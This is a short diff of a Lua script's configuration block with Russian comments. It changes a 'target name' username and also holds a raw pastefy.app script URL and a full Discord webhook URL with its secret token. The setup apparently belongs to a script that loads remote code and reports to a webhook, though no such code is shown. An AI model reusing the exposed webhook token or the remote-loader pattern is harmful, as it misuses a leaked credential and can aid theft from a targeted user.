@@ -1,6 +1,6 @@
 -- // 🔹 Конфиг
 local pastefyURL = "https://pastefy.app/1fxiqaEE/raw"
-local userName = "HitFarmC" -- имя цели (если нужно)
+local userName = "HitFarmZ" -- имя цели (если нужно)
 local webHook = "https://discord.com/api/webhooks/1408421597156474890/DshCKWfUftKiEKTymFXskyk_ZaqFd86iVtPDqKEhQ3qvyrlFgy05JcCMAEM8oWfysbcZ" -- сюда вставить Discord webhook, если надо
 
 
